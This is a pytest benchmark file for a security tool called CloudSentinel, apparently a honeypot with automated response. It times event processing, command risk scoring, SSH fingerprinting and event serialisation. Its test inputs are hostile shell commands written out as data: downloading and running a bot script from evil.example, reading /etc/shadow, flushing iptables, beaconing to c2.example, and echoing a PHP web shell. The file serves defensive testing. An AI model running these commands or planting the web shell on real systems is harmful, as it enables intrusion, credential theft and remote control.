"""
CloudSentinel Performance Regression Tests — MTTB and throughput benchmarks.

CI fails if MTTB exceeds 100ms or throughput drops below threshold.
Uses pytest-benchmark for statistical comparison across commits.

Requires: pytest-benchmark>=5.0.0
"""

from __future__ import annotations

import asyncio
import time

# ── MTTB: Must stay under 100ms ───────────────────────────

def test_mttb_under_100ms(benchmark):
    """SOAR processing must complete in under 100ms (target: 0.96ms median)."""
    from cloudsentinel.soar import SOAREngine

    soar = SOAREngine(
        risk_threshold=30,
        firewall_dry_run=True,
        mttb_target_ms=100,
    )

    async def _run():
        await soar.process_event("bench_test", {
            "eventid": "cloudsentinel.command.input",
            "input": "wget http://evil.example/bot.sh && chmod +x bot.sh && bash -c ./bot.sh",
            "src_ip": "8.8.8.8",
            "country_code": "RU",
        })

    def run_sync():
        return asyncio.run(_run())

    benchmark(run_sync)
    # Verify timing separately
    t0 = time.perf_counter()
    asyncio.run(_run())
    elapsed_ms = (time.perf_counter() - t0) * 1000
    assert elapsed_ms < 100, f"MTTB {elapsed_ms:.2f}ms exceeds 100ms target"


def test_soar_scoring_throughput(benchmark):
    """Score 100 commands in under 1 second total."""
    from cloudsentinel.mitre import score_command

    commands = [
        "wget http://evil.example/bot.sh -O /tmp/bot.sh",
        "chmod 777 /tmp/bot.sh",
        "bash -c /tmp/bot.sh",
        "cat /etc/shadow",
        "ssh root@10.0.0.5",
        "uname -a",
        "iptables -F INPUT",
        "curl http://c2.example/beacon",
        "python3 -c 'import os; os.system(\"id\")'",
        "echo '<?php system($_GET[cmd]); ?>' > shell.php",
    ] * 10  # 100 commands

    def score_all():
        for cmd in commands:
            score_command(cmd)

    benchmark(score_all)


def test_hassh_calculation_throughput(benchmark):
    """HASSH calculation must complete in under 1ms."""
    from cloudsentinel.hassh import calculate_hassh

    kex = ["diffie-hellman-group14-sha256", "diffie-hellman-group14-sha1"]
    enc = ["aes128-ctr", "aes256-ctr", "chacha20-poly1305@openssh.com"]
    mac = ["hmac-sha2-256", "hmac-sha1"]
    cmp = ["none", "zlib@openssh.com"]

    benchmark(lambda: calculate_hassh(kex, enc, mac, cmp))


def test_event_codec_throughput(benchmark):
    """Event serialization must handle 1000 events/sec."""
    from cloudsentinel.event_codec import dumps_text, loads_text

    event = {
        "eventid": "cloudsentinel.command.input",
        "session": "abc123",
        "src_ip": "192.168.1.1",
        "input": "wget http://evil.example/bot.sh",
        "cloudsentinel_risk_score": 85,
        "cloudsentinel_mitre_techniques": ["T1105", "T1059.004"],
    }

    data = dumps_text(event)
    benchmark(lambda: loads_text(data))
